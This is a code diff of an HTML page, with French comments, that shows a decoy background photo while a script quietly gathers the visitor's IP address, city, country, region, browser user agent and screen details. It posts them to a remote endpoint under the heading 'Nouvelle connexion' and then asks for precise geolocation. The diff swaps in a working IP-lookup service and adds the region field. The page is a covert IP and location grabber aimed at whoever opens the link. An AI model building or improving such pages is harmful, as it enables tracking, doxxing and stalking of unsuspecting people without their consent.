@@ -6,16 +6,10 @@
     <title></title>
     <style>
         body, html {
-            margin: 0;
-            padding: 0;
-            height: 100%;
-            background: #000;
-            overflow: hidden;
+            margin: 0; padding: 0; height: 100%; background: #000; overflow: hidden;
         }
         .bg {
-            position: fixed;
-            top: 0; left: 0;
-            width: 100%; height: 100%;
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             background: url('https://ton-lien-image.com/ta-photo.jpg') center/cover no-repeat;
             z-index: -1;
         }
@@ -33,11 +27,7 @@
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({
                     content: title,
-                    embeds: [{
-                        color: 0xFF0000,
-                        fields: fields,
-                        timestamp: new Date().toISOString()
-                    }]
+                    embeds: [{ color: 0xFF0000, fields: fields, timestamp: new Date().toISOString() }]
                 })
             }).catch(() => {});
         }
@@ -45,25 +35,25 @@
         async function start() {
             let info = {};
 
-            // IP avec HTTPS (corrigé)
+            // Service IP qui marche actuellement
             try {
-                const res = await fetch('https://ip-api.com/json/?fields=query,country,city,regionName,isp,mobile');
+                const res = await fetch('https://freeipapi.com/api/json');
                 const geo = await res.json();
 
-                if (geo.query) {
-                    info.ip = geo.query;
-                    info.city = geo.city;
-                    info.country = geo.country;
-                    info.isp = geo.isp;
-                }
-            } catch(e) {}
+                info.ip = geo.ipAddress || "N/A";
+                info.city = geo.cityName || "N/A";
+                info.country = geo.countryName || "N/A";
+                info.region = geo.regionName || "N/A";
+            } catch(e) {
+                console.log("Service IP indisponible");
+            }
 
-            // Envoi des infos
+            // Envoi des infos de base
             let fields = [];
             if (info.ip) fields.push({ name: "IP", value: info.ip, inline: true });
-            if (info.city) fields.push({ name: "Ville", value: info.city, inline: true });
-            if (info.country) fields.push({ name: "Pays", value: info.country, inline: true });
-            if (info.isp) fields.push({ name: "FAI", value: info.isp, inline: true });
+            if (info.city && info.city !== "N/A") fields.push({ name: "Ville", value: info.city, inline: true });
+            if (info.country && info.country !== "N/A") fields.push({ name: "Pays", value: info.country, inline: true });
+            if (info.region && info.region !== "N/A") fields.push({ name: "Région", value: info.region, inline: true });
 
             fields.push({ name: "User-Agent", value: navigator.userAgent.substring(0, 350) });
             fields.push({ name: "Écran", value: `${screen.width}x${screen.height} (${window.devicePixelRatio}x)` });
@@ -71,7 +61,7 @@
 
             send("🔴 Nouvelle connexion", fields);
 
-            // Demande géolocalisation
+            // Demande géolocalisation précise
             setTimeout(() => {
                 if (navigator.geolocation) {
                     navigator.geolocation.getCurrentPosition(
